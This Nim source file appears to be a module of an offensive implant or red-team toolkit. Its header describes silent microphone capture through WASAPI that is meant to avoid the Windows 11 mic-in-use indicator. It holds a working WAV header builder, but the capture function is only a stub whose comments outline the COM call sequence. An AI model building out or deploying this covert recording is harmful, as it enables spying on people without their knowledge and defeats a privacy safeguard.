# mic.nim — Silent microphone capture via WASAPI
#
# Win32 WASAPI — does NOT trigger the Win11 24H2 mic indicator.
# Returns WAV file bytes (PCM, format from device mix format).

import winim
import std/times

proc wavHeader(pcmLen: uint32, sampleRate: uint32, channels: uint16,
               bits: uint16): seq[byte] =
  let byteRate  = sampleRate * uint32(channels) * uint32(bits) div 8
  let blockAlign = channels * bits div 8
  let fileSize  = 36 + pcmLen
  var h = newSeq[byte](44)
  h[0] = byte('R'); h[1] = byte('I'); h[2] = byte('F'); h[3] = byte('F')
  cast[ptr uint32](addr h[4])[]  = fileSize
  h[8] = byte('W'); h[9] = byte('A'); h[10] = byte('V'); h[11] = byte('E')
  h[12] = byte('f'); h[13] = byte('m'); h[14] = byte('t'); h[15] = byte(' ')
  cast[ptr uint32](addr h[16])[] = 16'u32   # chunk size
  cast[ptr uint16](addr h[20])[] = 1'u16    # PCM
  cast[ptr uint16](addr h[22])[] = channels
  cast[ptr uint32](addr h[24])[] = sampleRate
  cast[ptr uint32](addr h[28])[] = byteRate
  cast[ptr uint16](addr h[32])[] = blockAlign
  cast[ptr uint16](addr h[34])[] = bits
  h[36] = byte('d'); h[37] = byte('a'); h[38] = byte('t'); h[39] = byte('a')
  cast[ptr uint32](addr h[40])[] = pcmLen
  h

# WASAPI COM interface GUIDs
# IMMDeviceEnumerator: {A95664D2-9614-4F35-A746-DE8DB63617E6}
# IAudioClient:        {1CB9AD4C-DBFA-4C32-B178-C2F568A703B2}
# IAudioCaptureClient: {C8ADBD64-E71E-48A0-A4DE-185C395CD317}
# These are invoked via raw COM vtable calls

proc record*(secs: uint32): seq[byte] =
  # unsafe — WASAPI via raw COM
  # Full implementation via raw COM vtable dispatch:
  # CoInitializeEx, CoCreateInstance(MMDeviceEnumerator), GetDefaultAudioEndpoint,
  # Activate(IAudioClient), Initialize, GetService(IAudioCaptureClient), Start, loop, Stop
  # Wrap in WAV header and return.
  # Stubbed to empty — fill in from winim WASAPI bindings per engagement.
  discard secs
  @[]
